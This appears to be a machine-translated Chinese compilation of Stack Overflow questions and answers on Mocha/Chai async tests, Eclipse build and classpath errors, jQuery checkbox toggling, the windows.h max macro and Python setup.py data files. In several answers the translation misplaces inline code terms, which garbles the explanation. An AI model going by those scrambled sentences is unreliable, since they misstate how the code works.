[http://www.robfe.com/2012/07/creating-tiled-backgrounds-in-metro-style-xaml-apps/](http://www.robfe.com/2012/07/creating-tiled-backgrounds-in-metro-style-xaml-apps/)

请注意，尽管我不确定它对捕捉和旋转的响应如何，但它可能会在全屏模式下工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-04T07:32:20.430

[http://www.mindscapehq.com/](http://www.mindscapehq.com/)现在有一个 TiledBackground 控件。

[http://www.philliphaydon.com/2013/01/windows-store-app-tiled-background/](http://www.philliphaydon.com/2013/01/windows-store-app-tiled-background/)

`<ms:TileBackground ImageSource="/Assets/debut_dark.png" />`

需要许可证才能访问夜间构建。

# javascript - 有没有办法让 Chai 使用异步 Mocha 测试？

> ID：11235815
> 
> 赞同：81
> 
> 时间：2012-06-27T22:43:58.463
> 
> 标签：javascript, unit-testing, mocha.js

我正在使用 Browser Runner 在 Mocha 中运行一些异步测试，并且我正在尝试使用 Chai 的期望样式断言：

```
window.expect = chai.expect;
describe('my test', function() {
  it('should do something', function (done) {
    setTimeout(function () {
      expect(true).to.equal(false);
    }, 100);
  }
} 
```

这不会给我正常的失败断言消息，而是我得到：

```
Error: the string "Uncaught AssertionError: expected true to equal false" was thrown, throw an Error :)
    at Runner.fail (http://localhost:8000/tests/integration/mocha/vendor/mocha.js:3475:11)
    at Runner.uncaught (http://localhost:8000/tests/integration/mocha/vendor/mocha.js:3748:8)
    at uncaught (http://localhost:8000/tests/integration/mocha/vendor/mocha.js:3778:10) 
```

所以它显然捕捉到了错误，只是没有正确显示它。任何想法如何做到这一点？我想我可以用一个错误对象调用“完成”，但是我失去了像 Chai 这样的东西的所有优雅，它变得非常笨重......

* * *

## 回答 #1

> 赞同：97
> 
> 时间：2013-03-04T18:07:24.023

您的异步测试会在失败的 ations 上生成一个异常，该异常`expect()`无法被捕获，`it()`因为该异常是在 的范围之外引发`it()`的。

您看到显示的捕获异常是使用`process.on('uncaughtException')`节点下或`window.onerror()`在浏览器中捕获的。

要解决此问题，您需要在调用的异步函数中捕获异常`setTimeout()`，以便`done()`将异常作为第一个参数进行调用。您还需要`done()`不带参数调用以指示成功，否则 mocha 会报告超时错误，因为您的测试函数永远不会发出信号表明它已完成：

```
window.expect = chai.expect;

describe( 'my test', function() {
  it( 'should do something', function ( done ) {
    // done() is provided by it() to indicate asynchronous completion
    // call done() with no parameter to indicate that it() is done() and successful
    // or with an error to indicate that it() failed
    setTimeout( function () {
      // Called from the event loop, not it()
      // So only the event loop could capture uncaught exceptions from here
      try {
        expect( true ).to.equal( false );
        done(); // success: call done with no parameter to indicate that it() is done()
      } catch( e ) {
        done( e ); // failure: call done with an error Object to indicate that it() failed
      }
    }, 100 );
    // returns immediately after setting timeout
    // so it() can no longer catch exception happening asynchronously
  }
} 
```

在所有测试用例上这样做很烦人，而且不是 DRY，因此您可能希望提供一个函数来为您执行此操作。让我们调用这个函数`check()`：

```
function check( done, f ) {
  try {
    f();
    done();
  } catch( e ) {
    done( e );
  }
} 
```

现在`check()`，您可以按如下方式重写异步测试：

```
window.expect = chai.expect;

describe( 'my test', function() {
  it( 'should do something', function( done ) {
    setTimeout( function () {
      check( done, function() {
        expect( true ).to.equal( false );
      } );
    }, 100 );
  }
} 
```

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2015-12-19T03:33:53.333

这是我对 ES6/ES2015 Promise 和 ES7/ES2016 async/await 的通过测试。希望这为研究此主题的任何人提供了一个很好的更新答案：

```
import { expect } from 'chai'

describe('Mocha', () => {
  it('works synchronously', () => {
    expect(true).to.equal(true)
  })

  it('works ansyncronously', done => {
    setTimeout(() => {
      expect(true).to.equal(true)
      done()
    }, 4)
  })

  it('throws errors synchronously', () => {
    return true
    throw new Error('it works')
  })

  it('throws errors ansyncronously', done => {
    setTimeout(() => {
      return done()
      done(new Error('it works'))
    }, 4)
  })

  it('uses promises', () => {
    var testPromise = new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve('Hello')
      }, 4)
    })

    testPromise.then(result => {
      expect(result).to.equal('Hello')
    }, reason => {
      throw new Error(reason)
    })
  })

  it('uses es7 async/await', async (done) => {
    const testPromise = new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve('Hello')
      }, 4)
    })

    try {
      const result = await testPromise
      expect(result).to.equal('Hello')
      done()
    } catch(err) {
      done(err)
    }
  })

  /*
  *  Higher-order function for use with async/await (last test)
  */
  const mochaAsync = fn => {
    return async (done) => {
      try {
        await fn()
        done()
      } catch (err) {
        done(err)
      }
    }
  }

  it('uses a higher order function wrap around async', mochaAsync(async () => {
    const testPromise = new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve('Hello')
      }, 4)
    })

    expect(await testPromise).to.equal('Hello')
  }))
}) 
```

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2014-02-10T15:22:35.137

如果你喜欢承诺，试试[Chai 作为 Promised](http://chaijs.com/plugins/chai-as-promised) + [Q](https://github.com/kriskowal/q)，它允许这样的事情：

```
doSomethingAsync().should.eventually.equal("foo").notify(done); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-20T14:50:53.660

我在 Mocha 邮件列表中问过同样的问题。他们基本上告诉我：用 Mocha 和 Chai 编写异步测试：

*   始终以`if (err) done(err);`
*   始终以 . 结束测试`done()`。

它解决了我的问题，并且没有改变我中间的任何一行代码（Chai 期望等）。这`setTimout`不是进行异步测试的方法。

这是[邮件列表中讨论的链接](https://groups.google.com/forum/?fromgroups#!topic/mochajs/4tDByBROM1Y%5B1-25%5D)。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-11-27T21:37:29.943

我已经发布了一个解决这个问题的包。

首先安装`check-chai`软件包：

`npm install --save check-chai`

然后在您的测试中，使用`chai.use(checkChai);`然后使用`chai.check`辅助函数，如下所示：

```
var chai = require('chai');
var dirtyChai = require('dirty-chai');
var checkChai = require('check-chai');
var expect = chai.expect;
chai.use(dirtyChai);
chai.use(checkChai);

describe('test', function() {

  it('should do something', function(done) {

    // imagine you have some API call here
    // and it returns (err, res, body)
    var err = null;
    var res = {};
    var body = {};

    chai.check(done, function() {
      expect(err).to.be.a('null');
      expect(res).to.be.an('object');
      expect(body).to.be.an('object');
    });

  });

}); 
```

Per[有没有办法让 Chai 使用异步 Mocha 测试？](https://stackoverflow.com/questions/11235815/is-there-a-way-to-get-chai-working-with-asynchronous-mocha-tests/15208067#comment55687475_15208067)我将其作为 NPM 包发布。

请参阅[https://github.com/niftylettuce/check-chai](https://github.com/niftylettuce/check-chai)了解更多信息。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-11-15T03:11:30.377

试试 chaiAsPromised！除了出色的命名之外，您还可以使用以下语句：

`expect(asyncToResultingValue()).to.eventually.equal(true)`

[可以确认](https://i.stack.imgur.com/ff6Ce.gif)，对于 Mocha + Chai 非常有效。

[https://github.com/domenic/chai-as-promised](https://github.com/domenic/chai-as-promised)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-03-14T20:41:26.767

[与Jean Vincent 的回答](https://stackoverflow.com/a/15208067/8985)非常相关并受到启发，我们使用了一个与他的函数类似的辅助函数`check`，但我们`eventually`改为调用它（这有助于它与 chai-as-promised 的命名约定相匹配）。它返回一个函数，该函数接受任意数量的参数并将它们传递给原始回调。这有助于消除测试中额外的嵌套函数块，并允许您处理任何类型的异步回调。这里是用 ES2015 编写的：

```
function eventually(done, fn) {
  return (...args) => {
    try {
      fn(...args);
      done();
    } catch (err) {
      done(err);
    }
  };
}; 
```

示例用法：

```
describe("my async test", function() {
  it("should fail", function(done) {
    setTimeout(eventually(done, (param1, param2) => {
      assert.equal(param1, "foo");   // this should pass
      assert.equal(param2, "bogus"); // this should fail
    }), 100, "foo", "bar");
  });
}); 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-11-23T16:51:09.897

我知道有很多重复的答案和建议的包来解决这个问题，但是我还没有看到上面的简单解决方案为这两个用例提供了一个简洁的模式。我将其发布为其他希望复制意大利面的综合答案：

## 事件回调

```
function expectEventCallback(done, fn) {
  return function() {
    try { fn(...arguments); }
    catch(error) { return done(error); }
    done();
  };
} 
```

## 节点样式回调

```
function expectNodeCallback(done, fn) {
  return function(err, ...args) {
    if (err) { return done(err); }
    try { fn(...args); }
    catch(error) { return done(error); }
    done();
  };
} 
```

## 示例用法

```
it('handles event callbacks', function(done) {
  something.on('event', expectEventCallback(done, (payload) => {
    expect(payload).to.have.propertry('foo');
  }));
});

it('handles node callbacks', function(done) {
  doSomething(expectNodeCallback(done, (payload) => {
    expect(payload).to.have.propertry('foo');
  }));
}); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-08-29T09:04:00.523

我解决了它提取`try/catch`到一个函数。

```
function asyncExpect(test, done){
    try{
        test();
        done();
    } catch(error){
        done(error);
    }
} 
```

然后在`it()`我打电话：

```
it('shall update a host', function (done) {
            testee.insertHost({_id: 'host_id'})
                .then(response => {
                    asyncExpect(() => {
                        expect(response).to.have.property('ok', 1);
                        expect(response).to.have.property('nModified', 1);
                    }, done);
                });

        }); 
```

它也是可调试的。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-09-02T09:46:50.003

基于@richardforrester [http://staxmanade.com/2015/11/testing-asyncronous-code-with-mochajs-and-es7-async-await/](http://staxmanade.com/2015/11/testing-asyncronous-code-with-mochajs-and-es7-async-await/)提供的此链接，如果省略 done，describe 可以使用返回的 Promise范围。

唯一的缺点是那里必须有一个 Promise，而不是任何异步函数（你可以用 Promise 包装它）。但在这种情况下，代码可以大大减少。

它考虑了初始 funcThatReturnsAPromise 函数或期望中的失败：

```
it('should test Promises', function () { // <= done removed
    return testee.funcThatReturnsAPromise({'name': 'value'}) // <= return added
        .then(response => expect(response).to.have.property('ok', 1));
}); 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2019-04-05T01:58:15.853

测试和异步期间的计时器听起来很粗糙。有一种方法可以使用基于承诺的方法来做到这一点。

```
const sendFormResp = async (obj) => {
    const result = await web.chat.postMessage({
        text: 'Hello world!',
    });
   return result
} 
```

此异步函数使用 Web 客户端（在本例中为 Slacks SDK）。SDK 负责 API 调用的异步特性并返回有效负载。然后，我们可以通过运行`expect`异步承诺中返回的对象来测试 chai 中的有效负载。

```
describe("Slack Logic For Working Demo Environment", function (done) {
    it("Should return an object", () => {
        return sdkLogic.sendFormResp(testModels.workingModel).then(res => {
            expect(res).to.be.a("Object");
        })
    })
}); 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2021-06-09T07:10:55.607

一种更简单的方法是使用[等待期望](https://www.npmjs.com/package/wait-for-expect)库。

```
const waitForExpect = require("wait-for-expect")

test("it waits for the number to change", async () => {
  let numberToChange = 10;

  setTimeout(() => {
    numberToChange = 100;
  }, randomTimeout);

  await waitForExpect(() => {
    expect(numberToChange).toEqual(100);
  });
}); 
```

* * *

## 回答 #13

> 赞同：-2
> 
> 时间：2015-09-07T20:16:06.407

对我来说非常有效的 icm Mocha / Chai 是来自 Sinon 图书馆的 fakeTimer。只需在必要时提前测试中的计时器。

```
var sinon = require('sinon');
clock = sinon.useFakeTimers();
// Do whatever. 
clock.tick( 30000 ); // Advances the JS clock 30 seconds. 
```

具有更快完成测试的额外好处。

* * *

## 回答 #14

> 赞同：-2
> 
> 时间：2016-09-15T09:06:35.873

您还可以使用域模块。例如：

```
var domain = require('domain').create();

domain.run(function()
{
    // place you code here
});

domain.on('error',function(error){
    // do something with error or simply print it
}); 
```

# java - 无法在 eclipse 中制作正常的包

> ID：11235816
> 
> 赞同：0
> 
> 时间：2012-06-27T22:44:19.880
> 
> 标签：java, eclipse, ubuntu

在 Eclipse 中，我有两个具有相同包结构的项目。在其中一个错误中，我删除了包。当我想建立结构时，我再次迷失了方向，我看到了：

![在此处输入图像描述](../Images/a158d6186c61bce645b851673d68fa7f.png)

不是这个 ：

![在此处输入图像描述](../Images/fc4755d36f179094daa1b3fe160b5fcf.png)

怎么了 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:48:25.943

您可能在 Navigator 视图中浏览，而不是 Package Explorer 视图。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:49:58.467

确保该文件夹位于您的构建路径中。

尝试右键单击它并选择“构建路径”>“包含”。

# javascript - jQuery - 未选中复选框

> ID：11235817
> 
> 赞同：3
> 
> 时间：2012-06-27T22:44:20.427
> 
> 标签：javascript, jquery, html, forms, checkbox

我正在使用复选框来切换注册表单上某些多列表的启用和禁用状态。复选框标有类别，多列表包含属于该类别的项目。

我正在使用 jQuery 1.7.2。

```
 $('#sch_cat_hockeyschools').toggle(function(ev) {
                ev.stopPropagation();
                $("#type_select_hockeyschools").prop("disabled", false);
                $("#type_select_hockeyschools").removeProp("disabled", "disabled");
                $("#sch_cat_hockeyschools").prop("checked", true);
                $("#sch_cat_hockeyschools").prop("checked", "checked");
            }, function(ev) {
                ev.stopPropagation();
                $("#type_select_hockeyschools option:selected").removeAttr("selected");
                $("#type_select_hockeyschools").prop("disabled", true);
                $("#type_select_hockeyschools").prop("disabled", "disabled");
                $("#sch_cat_hockeyschools").prop("checked", false);
                $("#sch_cat_hockeyschools").removeProp("checked");
            }); 
```

对应复选框 HTML 示例：

```
<input class="catmark" type="checkbox" name="sch_categories[]" id="sch_cat_hockeyschools" value="1" />General Hockey Schools
<input class="catmark" type="checkbox" name="sch_categories[]" id="sch_cat_springhockey" value="2" />Spring Hockey 
```

问题是单击复选框后，复选框不会被勾选或选中；它立即返回到未经检查的状态，我认为该`stopPropagation()`功能会有所帮助。显然不是。多列表按预期启用和禁用，但未选中复选框。

这个问题的结果是，提交表单时，包含所选类别的数组为空；因此，因为至少有一个选中的类别是表单中的必填字段，所以处理表单的 PHP 脚本会引发我的一个错误，告诉我必填字段留空。

关于如何确保复选框实际被选中，并通过扩展，将实际数据发布到处理脚本的任何想法？

多谢你们。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T22:58:04.533

问题是使用`toggle`-- 根据[文档](http://api.jquery.com/toggle-event/)：

> 该实现还在事件上调用 .preventDefault() ，因此如果在元素上调用了 .toggle() ，则不会跟踪链接并且不会单击按钮。

`toggle`本身正在调用`preventDefault`，它正在停止事件的默认行为，选中/取消选中该框。

而不是切换，使用`bind`或`on`（*见下面的编辑说明*）为`change`事件添加一个监听器，您可以在其中检查状态：

```
$('#sch_cat_hockeyschools').on('change', function () {
    if (this.checked) {
        // do stuff for a checked box   
        console.log('check is on');
    } else {
        // do stuff for an unchecked box        
        console.log('check is off');
    }
}); 
```

[在 jsFiddle 尝试一下](http://jsfiddle.net/LzVA2/)。

**编辑** 请注意，此代码显示了该`on`方法的使用，而 jsFiddle 示例使用`bind`. 正如 Sam Sehnert 所指出的，`on`是使用 > jQuery 1.7 附加事件的首选方法。如果您使用的是旧版本的 jQuery，请使用`bind`jsFiddle 示例中的方法。

**文档**

*   [jQuery.toggle](http://api.jquery.com/toggle-event/)
*   [jQuery.bind](http://api.jquery.com/bind/)
*   [jQuery.on](http://api.jquery.com/on/)

# c++ - std::cin.ignore(std::numeric_limits ::max(), '\n') 使用 #include 时出错

> ID：11235819
> 
> 赞同：6
> 
> 时间：2012-06-27T22:44:29.833
> 
> 标签：c++, max, cin

在 Visual Studio 2010 Pro 中，我收到一个编译错误，`max()`在命令部分显示“需要一个标识符”。似乎在`windows.h`头文件中有一个`max(a,b)`标识符，编译器想要使用它。

我也尝试使用`#include <limits>`，但这并没有解决问题。

有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-06-27T22:48:21.990

自远古以来，标头就有 和 宏，它们经常导致 C++出现`<windows.h>`问题`min()`。`max()`幸运的是，您可以通过在 include`#define NOMINMAX`之前添加来禁用它们`<windows.h>`。

# python - setup.py 没有安装数据文件

> ID：11235820
> 
> 赞同：29
> 
> 时间：2012-06-27T22:44:45.577
> 
> 标签：python, python-2.7, distutils

我有一个 Python 库，除了常规的 Python 模块之外，还有一些需要放入 /usr/local/lib/python2.7/dist-package/mylibrary 的数据文件。

不幸的是，我无法说服 setup.py 在那里实际安装数据文件。请注意，此行为正在安装 - 而不是 sdist。

这是 setup.py 的略微编辑版本

```
module_list = list_of_files

setup(name         ='Modules',
      version      ='1.33.7',
      description  ='My Sweet Module',
      author       ='PN',
      author_email ='email',
      url          ='url',
      packages     = ['my_module'],

# I tried this. It got installed in /usr/my_module. Not ok.

      # data_files   = [ ("my_module",  ["my_module/data1",
      #                                  "my_module/data2"])]

# This doesn't install it at all.
      package_data = {"my_module" : ["my_module/data1",
                                     "my_module/data2"] }
     ) 
```

这是在 Python 2.7 中（最终必须在 2.6 中运行），并且必须在 10.04 和 12+ 之间的某些 Ubuntu 上运行。现在在 12.04 开发它。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-05-15T23:53:37.173

**UPD**： `package_data`接受格式中的 dict `{'package': ['list', 'of?', 'globs*']}`，因此要使其工作，应该指定相对于包目录的 shell glob，而不是相对于分发根目录的文件路径。

`data_files`具有不同的含义，通常应避免使用此参数。

使用 setuptools 你只需要`include_package_data=True`，但数据文件应该在 setuptools 已知的版本控制系统下（默认情况下它只识别 CVS 和 SVN，安装`setuptools-git`或者`setuptools-hg`如果你使用 git 或 hg...）

* * *

使用 setuptools，您可以：

~~- 在 MANIFEST.im 中：~~

 ~~```
 include my_module/data* 
```~~ 

~~- 在 setup.py 中：~~

 ~~```
 setup(
        ...
        include_package_data = True,
        ...
    ) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-27T23:27:28.103

[http://docs.python.org/distutils/setupscript.html#installing-additional-files](http://docs.python.org/distutils/setupscript.html#installing-additional-files)

> 如果 directory 是一个*相对路径*，它被解释为相对于安装前缀（Python 的 sys.prefix 用于纯 Python 包， sys.exec_prefix 用于包含扩展模块的包）。

这可能会做到：

```
data_files   = [ ("my_module",  ["local/lib/python2.7/dist-package/my_module/data1",
                                 "local/lib/python2.7/dist-package/my_module/data2"])] 
```

或者只是使用 join 添加前缀：

```
data_dir = os.path.join(sys.prefix, "local/lib/python2.7/dist-package/my_module")
data_files   = [ ("my_module",  [os.path.join(data_dir, "data1"),
                                 os.path.join(data_dir, "data2")])] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-01-12T20:15:44.080

以下解决方案对我来说很好。您应该有 setup.py 所在的 MANIFEST.in 文件。

将以下代码添加到清单文件

```
recursive-include mypackage *.json *.md # can be extended with more extensions or file names. 
```

另一种解决方案是将以下代码添加到 MANIFEST.in 文件中。

```
graft mypackage # will copy the entire package including non-python files. 
global-exclude __pyache__ *.txt # list files you dont want to include here. 
```

现在，当您执行 pip install 时，将包含所有必要的文件。

希望这可以帮助。

更新：确保您`include_package_data=True`在安装文件中也有~~

# java - Eclipse“错误：无法找到或加载主类”

> ID：11235827
> 
> 赞同：123
> 
> 时间：2012-06-27T22:45:16.587
> 
> 标签：java, eclipse, git, jar, classpath

我的笔记本电脑上有一个 Eclipse 项目，我将其推送到 Git [https://github.com/chrisbramm/LastFM-History-Graph.git](https://github.com/chrisbramm/LastFM-History-Graph.git)

它可以在我的笔记本电脑上完全运行，并且可以毫无问题地运行/构建，但在我的桌面上它没有 Eclipse 给出错误

> 错误：无法找到或加载主类 lastfmhistoryguis.InputPanel

我尝试从以下位置构建项目：

```
Project>Build Project 
```

但是什么也没发生。我已将`PATH`这台计算机上的变量设置为**JRE6、JRE7 和 JDK 1.7.0，**即使我的笔记本电脑上没有设置这些变量。

我的文件中确实有 Jar 文件（**last.fm-bindings-0.1.1.jar**），该文件位于笔记本电脑上`.classpath`的*C:\Users\Chris\Downloads*文件夹中，因此它不包含在我的 git 树中最近带入项目文件夹并提交，但我不确定我是否做得对。这是否也会引起问题，但那里没有主要论点。

我现在无法解决，我需要检查/更改什么。

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2014-07-02T16:39:48.673

如果您使用 . 创建一个 java 类`public static void main(String[] args)`，Eclipse 将通过右键单击文件本身或项目资源管理器中的文件为您运行该 main 方法，然后选择：

> “运行方式”->“Java 应用程序”。

完成此操作后，Eclipse 将存储有关您的类的信息，因此您可以轻松地从 Run As 菜单（工具栏上的绿色播放按钮）或从 Run Configurations 对话框再次运行该类。

如果您随后 MOVE Java 类（手动或然而），然后再次选择

> “运行方式”->“Java 应用程序”

从新位置，Eclipse 将运行原始存储的配置，尝试从其原始位置调用该类，这会导致此错误。

* * *

**解决方案：**
对我来说，解决方法是转到运行配置（绿色播放按钮-> 运行配置）并删除对类的所有引用。下次跑的时候

> “运行方式”->“Java 应用程序”

Eclipse 将为移动的类编写一个新配置，错误就会消失。

* * *

## 回答 #2

> 赞同：65
> 
> 时间：2014-12-15T16:28:25.360

**tl;dr**：清理整个构建路径以及您手动添加到其中的所有内容。这包括其他来源、项目、库。

*   项目 -> 清理
*   确保 Project -> Build automatically 处于活动状态
*   项目 -> 属性 -> Java 构建路径 -> 库：*删除您曾经添加的任何外部库*。不要删除 JRE 系统库等标准库。
*   现在尝试运行您的主要课程。“找不到/加载类”错误应该消失了。尝试一个接一个地添加您的外部库/罐子。

这背后的原因：编译器在将库链接到项目时遇到问题。它失败并产生了错误的错误消息。

就我而言，它应该是“无法将 AutoHotkey.dll 添加到构建路径”之类的东西，因为那是导致编译器失败的原因。

* * *

如果这仍然不起作用，请查看**Eclipse 的内置 ErrorLog**：

> 窗口 -> 显示视图 -> 常规 -> 错误日志

* * *

## 回答 #3

> 赞同：44
> 
> 时间：2012-06-27T23:06:44.993

在您的类路径中，您使用的是绝对路径，但您已将项目移动到一台具有不同文件结构的新机器上。

因此，在您的类路径中（如果您要将 JARS 与您的项目捆绑在一起，可能一般来说），使用相对路径：

在您的 .classpath 更改中

```
<classpathentry kind="lib" path="C:/Users/Chris/Downloads/last.fm-bindings-0.1.1.jar" sourcepath=""/><classpathentry kind="lib" path="C:/Users/Chris/Downloads/last.fm-bindings-0.1.1.jar" sourcepath=""/> 
```

到

```
<classpathentry kind="lib" path="last.fm-bindings-0.1.1.jar"/> 
```

* * *

## 回答 #4

> 赞同：33
> 
> 时间：2016-11-16T15:14:27.350

我做了上面提到的所有事情，但没有一个对我有用

我的问题解决如下：

1.  右键单击您的**Project > Properties > JavaBuildPath > Libraries**。
2.  删除 jar 文件，上面有一个红旗。
3.  如果问题仍然存在，请尝试以下解决方案。当我第二次遇到这个问题时，这对我有用：
    1.  *右键单击* **项目 > 属性 > Java 构建路径 > 库**
    2.  删除库
    3.  添加库。（选择 JRE 系统库）

* * *

## 回答 #5

> 赞同：20
> 
> 时间：2014-07-23T13:17:48.850

花了近一个小时后，我在我的 maven webapp 项目中遇到了类似的问题，我找到了一个对我有用的解决方案。我输入了以下 maven 命令并且它有效

**mvn clean install -U**
我不知道它背后的确切原因。

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2014-02-26T17:30:49.017

我假设您已将该项目导入桌面 Eclipse 安装？如果是这种情况，您只需选择 Project > Clean。然后重建你的项目。对我来说就像一个魅力。

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2015-08-26T21:55:54.627

非常小心：这会将您的项目与工作区解除绑定。您必须再次导入所有项目

我遇到了同样的问题并使用以下方法解决了它：

```
Eclipse Mars
Egit
Github
Maven Project 
```

**问题**是我将我的 maven 项目提供给 github。它将我的项目**移动**到我的 github 文件夹中。

**解决方案：**

*   关闭日食
*   删除工作区中的元数据文件夹
*   重启 Eclipse

将显示开始屏幕。

*   关闭开始屏幕
*   右键单击进入包资源管理器
*   选择“导入maven项目”，
*   导航到您的 github 文件夹并导入 maven 项目。

在此之后，我的项目编译成功。

* * *

## 回答 #8

> 赞同：7
> 
> 时间：2013-10-24T16:20:46.693

通过以下任一方式检查您的项目是否有构建器：

*   检查项目属性（在“包资源管理器”中，右键单击项目，选择“属性”），第二部分是“构建器”，它应该包含默认的“Java Builder”
*   或查看“.project”文件（在 .../workspace/yourProjectName/.project 中），“buildSpec”部分不应为空。

肯定有其他方法，但我所做的是：

*   关闭日食
*   编辑 ."project" 文件以添加 "buildSpec" 部分
*   重启日食

一个适当的最小 java ".project" 文件应该如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<projectDescription>
        <name>myProjectName</name>
        <comment></comment>
        <projects>
        </projects>
        <buildSpec>
                <buildCommand>
                        <name>org.eclipse.jdt.core.javabuilder</name>
                        <arguments>
                        </arguments>
                </buildCommand>
        </buildSpec>
        <natures>       
                    <nature>org.eclipse.jdt.core.javanature</nature>
        </natures>      
</projectDescription> 
```

* * *

## 回答 #9

> 赞同：7
> 
> 时间：2015-04-23T05:30:00.363

好吧，以下对我有用...

1.  进入项目文件夹（内部`workspace`）
2.  然后，删除了`bin`文件夹
3.  然后，清理项目/项目（在 Eclipse 中）
4.  从 Eclipse 构建/运行。

* * *

## 回答 #10

> 赞同：6
> 
> 时间：2017-12-21T16:52:36.023

如果您的代码很好，并且您知道自己遇到了 Eclipse 问题，那么这将解决它。

您可以简单地删除 $yourproject/.classpath 、 $yourproject/.project 和 $yourworkspace/.metadata。其他人提到了这个选项。不过，它会炸毁你的整个工作空间。反而：

1.  从您的项目中删除 .classpath 和 .project
2.  在 Eclipse 中删除您的项目。**不要检查**磁盘上的删除项目内容。
3.  现在，在文件资源管理器中，进入 $yourworkspace/.metadata。
4.  搜索 $yourprojectname
5.  删除您找到的所有内容。删除 .metadata 目录中的任何内容应该是安全的。
6.  在 Eclipse 中：文件 > 导入 > 常规 > 文件夹或存档中的项目 > $yourproject > 完成
7.  右键单击您的项目 > 属性 > Java 构建路径 > 源选项卡
8.  选择所有源文件夹，删除。
9.  添加文件夹，选择 src（无论您的 src 文件夹被称为什么）并添加它
10.  转到库选项卡
11.  在此处将任何 jars 添加到您的构建路径中。您的项目现在应该不再有错误。
12.  像往常一样运行您的项目。

* * *

## 回答 #11

> 赞同：5
> 
> 时间：2014-08-08T11:16:56.203

类似的事情发生在我身上几次，我知道解决这个问题的唯一方法是删除元数据文件夹。幸运的是，我找到了另一种方法。

尝试转到项目**属性> Java Build Path > Order And Export 选项卡> 全选**（或尝试使用那里的复选框）。

这应该会导致完整的项目重建和 Eclipse 看到主类。

补充：我注意到当您在工作空间中有许多项目并且其中一些配置错误（出现红色感叹号）时会发生此错误。修复项目构建路径和其他设置（即使该项目与您遇到问题的项目无关）应该可以解决问题。

* * *

## 回答 #12

> 赞同：5
> 
> 时间：2020-02-04T17:36:59.257

对我来说，这个错误开始出现的原因是由于类路径超过了 Windows 的限制。然后我发现了“使用临时 JAR 指定类路径（以避免类路径长度限制）”选项。选择此选项为我解决了问题。该选项位于运行/调试配置、类路径选项卡中，请参见下图。

[![在此处输入图像描述](../Images/a458455ba102fb6ce9798c1a41c32dbf.png)](https://i.stack.imgur.com/xSXrq.png)

* * *

## 回答 #13

> 赞同：4
> 
> 时间：2014-02-12T22:32:43.563

我对正确的 .classpath 文件也有同样的问题，但很快发现实际上它不是 .classpath 文件（在我解决了这个问题后，我用原始文件替换了可行的 .classpath 文件，该项目仍然有效，这意味着 .类路径文件不是这种情况）

由于它是一个 Maven 项目，我所做的只是：

1.  mvn 日食：清洁
2.  删除eclipse项目
3.  导入项目
4.  完毕

* * *

## 回答 #14

> 赞同：4
> 
> 时间：2016-07-12T11:17:02.700

我的`Main class`找不到或加载问题是由一个有趣的原因引起的。

在我们的项目中，我们使用`Maven`的是构建工具和我`main class` `extends`的一个类，它在`class path`但它的范围是`test`，`main class`而不在测试包下。

如果您的主要课程`extends`是一个课程，请首先尝试`main class`通过删除`extends`部分来运行您的课程。如果它运行，你至少会明白问题不是因为`run configuration`或者`eclipse`是类，你的`main class` `extends`.

* * *

## 回答 #15

> 赞同：4
> 
> 时间：2018-10-11T11:12:21.743

如果您已导入 jre，这可能会导致 jdk 库

这发生在我身上，所以检查安装的jre jars

在 Eclipse 中单击 Windows > Preferences > Java > Installed Jres > 单击 Jre 并在查看 jar 列表后进行编辑，确保没有 jdk 或损坏，[![在此处输入图像描述](../Images/507849fad6097c9e5855c26dd19ab445.png)](https://i.stack.imgur.com/WbM8h.png)

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2013-07-13T14:09:17.677

我有这个错误。这是因为我有 `static void main(String[] args)`
而不是 `public static void main(String[] args)`

我花了将近一个小时试图弄清楚这一点。

**注意：**唯一的区别是我没有声明`main`是`public`

* * *

## 回答 #17

> 赞同：3
> 
> 时间：2013-11-23T13:38:45.350

当您的工作区路径中有特殊字符时，也会导致此问题。我的个人文件夹中有我的工作区，它的名称是希腊语，所以它不起作用。我改变了我的工作区，现在它的路径中只包含英文字符，现在项目的构建没有任何问题。

* * *

## 回答 #18

> 赞同：3
> 
> 时间：2015-05-19T10:36:13.313

如果您使用的是 eclipse，那么以下步骤将解决您的问题：

> 转到运行 -> 运行配置 -> 主类搜索 -> 手动定位您的类 -> 应用 -> 运行

* * *

## 回答 #19

> 赞同：3
> 
> 时间：2018-05-22T07:41:47.433

要解决此错误，请执行以下步骤：

第 1 步：打开**.project**文件。

第 2 步：检查两个标签...

```
 a) <buildSpec>

    b) <natures> 
```

第3步：如果上述标签不包含任何内容，那么肯定会发生上述错误。

第 4 步：将以下内容添加到每个标签以解决上述错误。

对于`<buildSpec>`：

```
<buildSpec>
    <buildCommand>
        <name>org.eclipse.jdt.core.javabuilder</name>
        <arguments>
        </arguments>
    </buildCommand>
</buildSpec> 
```

对于`<natures>`：

```
<natures>
    <nature>org.eclipse.jdt.core.javanature</nature>
</natures> 
```

第 5 步：按 ctrl + s 保存文件。

第6步：为了安全起见，只需关闭项目一次并重新打开它。

第7步：就是这样。你准备好摇滚了！！！

如果解决方案有帮助，请在评论中提及。

谢谢你。

* * *

## 回答 #20

> 赞同：2
